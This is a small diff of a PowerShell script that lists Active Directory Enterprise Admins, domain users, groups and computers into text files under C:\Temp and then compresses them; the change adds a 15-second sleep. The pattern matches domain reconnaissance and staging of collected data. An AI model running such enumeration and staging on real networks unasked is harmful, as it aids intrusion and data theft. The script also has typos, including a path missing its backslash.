@@ -2,6 +2,7 @@ net group "Enterprise Admins" /domain | Out-File C:\Temp\EntA.txt
 net user /domain | Out-File C:\Temp\DomnainU.txt
 net group /domain | Out-File C:\Temp\DomnainG.txt
 Get-ADComputer -filter * | Out-File C:\Temp\DomnainC.txt
+Start-sleep -s 15
 $compress = @{
   Path = "C:Temp\*.txt"
   CompressionLevel = "Fastest"
